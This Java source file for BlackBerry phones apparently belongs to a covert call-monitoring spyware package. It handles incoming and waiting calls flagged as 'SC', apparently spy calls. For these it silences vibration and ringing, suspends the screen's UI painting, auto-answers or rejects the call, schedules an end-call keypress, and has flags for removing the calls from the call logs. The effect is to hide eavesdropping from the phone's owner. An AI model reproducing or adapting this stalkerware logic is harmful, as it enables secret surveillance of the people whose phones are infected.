package com.vvt.bug;

import com.vvt.std.Log;
import net.rim.blackberry.api.phone.PhoneCall;
import net.rim.device.api.system.Audio;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.ui.UiApplication;

public class PELPFourSeven extends BasePELP {
	public void callWaiting(int callId) {
		try {
			callWaitingIdUnique = lastCallInitiatedOrIncomingId != callId;
			if (numberOfCallsConnected==0)
				numberOfCallsConnected=1;
			addPhoneCallToAdministration(callId);
			if (sCInProgress) {
				stopVibrateAndSound();
				rejectSCIncoming(pelSettings.waitBeforeEndNormalCallWhenSCActiveMS);
				rejectSCIncoming(pelSettings.waitBeforeEndSCWhenNormalCallWaitingMS);
			} else {
				if (callWaitingIdUnique) {
					PhoneCall sC = isSC(callId);
					if (sC != null) {
						volumeAudioOriginal = Audio.getVolume();
						stopVibrateAndSound();
						voiceApp.suspendPainting(true);
						rejectSCIncoming(pelSettings.waitBeforeRejectSCWaitingMS);
					}
				} else {
					disableSCRemovalFromLogs = true;
				}
			}
		} catch (Exception e) {
			Log.error("PELPFourSeven.callWaiting", "", e);
		}
	}

	protected void endSCCaseKeyPressed() {
		rejectSCIncoming(pelSettings.endSCInProgressTimeToWaitMS);
	}

	public void callIncoming(int callId) {
		try {
			if (numberOfCallsConnected > 0) {
				callWaiting(callId);
			} else {
				if (voiceApp == null)
					voiceApp = UiApplication.getUiApplication();
				volumeAudioOriginal = Audio.getVolume();
				stopVibrateAndSound();
				disableSCRemovalFromLogs = false;
				lastCallInitiatedOrIncomingId = callId;
				addPhoneCallToAdministration(callId);
				PhoneCall sC = isSC(callId);
				sCInProgress = sC != null;
				sCInjectEvent = sCInProgress;
				if (sCInProgress) {
					try {
						voiceApp.suspendPainting(true);
						determineAcceptSc();
						if (lastIncomingSCAccepted) {
							patScheduledEndCall = new PhoneKeyActionThread(null, (char) Keypad.KEY_END, pelSettings.scheduleEndSCWhenNotConnectedOrNotAnsweredMS);
						} else {
							rejectByEnd = voiceApp.isForeground();
						}
					} catch (Exception e) {
						
					}
				} else
					cancelStopVibrateAndSound();
			}
		} catch (Exception e) {
			Log.error("PELPFourSeven.callIncoming", "", e);
		}
	}
}